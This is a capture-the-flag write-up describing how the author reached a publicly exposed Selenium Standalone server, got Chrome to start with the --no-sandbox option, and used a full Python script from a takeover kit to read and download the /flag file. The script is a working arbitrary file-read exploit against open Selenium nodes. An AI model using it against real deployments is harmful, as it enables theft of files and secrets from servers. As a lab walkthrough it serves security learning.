We are given access to the challenge server (http://challs.nusgreyhats.org:12323). Visiting the website, we are greeted with the landing page of a service known as Selenium Standalone.

![pic1](https://user-images.githubusercontent.com/7780255/173223634-680035cf-2376-4e2d-bb6c-29aabd6ce4c2.PNG)

Snooping around the landing page leads us to the console page, where we are able to select the browser driver to run using a dropdown menu. However, all of the options available seem to not work, with the **chrome** option giving us a rather detailed error. 

![image](https://user-images.githubusercontent.com/7780255/173223716-3c8b9a1d-74e4-43e8-a4dc-73020f73d084.png)

Looking at the Dockerfile confirms our suspicions that indeed, only chromedriver was installed on the server. The driver seems unable to start because of some error.

```
from selenium/standalone-chrome:3.141.59

USER seluser

RUN wget https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb -P /tmp \
    && sudo dpkg -i /tmp/google-chrome-stable_current_amd64.deb \
    && rm /opt/selenium/chromedriver-94.0.4606.61 /tmp/google-chrome-stable_current_amd64.deb \
    && CHROME_MAJOR_VERSION=$(google-chrome --version | sed -E "s/.* ([0-9]+)(\.[0-9]+){3}.*/\1/") \
    && CHROME_DRIVER_VERSION=$(wget --no-verbose -O - "https://chromedriver.storage.googleapis.com/LATEST_RELEASE_${CHROME_MAJOR_VERSION}") \
    && echo "Using chromedriver version: "$CHROME_DRIVER_VERSION \
    && wget --no-verbose -O /tmp/chromedriver_linux64.zip https://chromedriver.storage.googleapis.com/$CHROME_DRIVER_VERSION/chromedriver_linux64.zip \
    && unzip /tmp/chromedriver_linux64.zip -d /opt/selenium \
    && mv /opt/selenium/chromedriver /opt/selenium/chromedriver-94.0.4606.61

COPY ./flag /flag
```

Furthermore, it seems that the flag has simply been copied to the root directory of the docker instance, which we will need to obtain in some way to get the flag.

Snooping around with Burpsuite, we find that the console simply sends post requests to the API, with the request body containing options such as which driver to run.

![image](https://user-images.githubusercontent.com/7780255/173224280-27881b1b-8409-4101-8363-fa1a30d946b8.png)

Perhaps we need to add more options to resolve the error. With a bit of googling, we find that we can establish a direct connection to the API and start a chromium instance using webdriver.remote. However, using the same payload only resulted in the same error. While fiddling with selenium startup options, apparently enabling the 
`--no-sandbox` allows us to establish a connection! It seems that the service was running in root, and so encountered this error `Running as root without --no-sandbox is not supported.`, which adding the option helped us resolve.

```
chrome_options = Options()
chrome_options.add_argument('--no-sandbox')
driver = webdriver.Remote("http://challs.nusgreyhats.org:12323/wd/hub", DesiredCapabilities.CHROME, options=chrome_options)
```

Now, we need to exfiltrate the file with this connection. Thankfully, there is an extremely helpful repo (https://github.com/JonStratton/selenium-node-takeover-kit) targetted at Selenium nodes like this one. Incorporating the packages provided (namely download.py), we are able to locate the flag file and download it to our local computer.

```
from selenium import webdriver
from selenium.webdriver.common.desired_capabilities import DesiredCapabilities
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.remote.file_detector import UselessFileDetector
import base64, getopt, sys

def get_file_contents(driver, remote_file):
    decoded_contents = None
    driver.get('data:text/html;charset=utf-8,<html><input id=f type=file onchange="rf(event)"><script>var inf; var rf = function(e) { var inp = e.target; var read = new FileReader(); read.onload = function(){inf = read.result;}; read.readAsDataURL(inp.files[0]);}</script></html>')
    driver.find_element_by_id('f').send_keys(remote_file) # Load local file into input field (and therefor "inf")
    js_return = driver.execute_script('return(inf)')   # Dump the contents of "inf"
    if js_return:
        decoded_contents = base64.b64decode(js_return.split(',')[1])
    else:
        print('Cannot Read: %s' % remote_file)
    return decoded_contents

chrome_options = Options()
chrome_options.add_argument('--no-sandbox')
driver = webdriver.Remote("http://challs.nusgreyhats.org:12323/wd/hub", DesiredCapabilities.CHROME, options=chrome_options)

local_file = "flag2"
remote_file = "/flag"
driver.file_detector = UselessFileDetector()

try:
    file_contents = get_file_contents(driver, remote_file)
    if local_file:
        f = open(local_file, 'w+b')
        f.write(file_contents)
        f.close()
    else:
        print(file_contents.decode('ascii'))
finally:
    driver.quit()

sys.exit(0)
```

Now, with the file in our hands, we can run a `strings flag2 | grep {` to get the flag `grey{publ1c_53l3n1um_n0d3_15_50_d4n63r0u5_8609b8f4caa2c513}`!
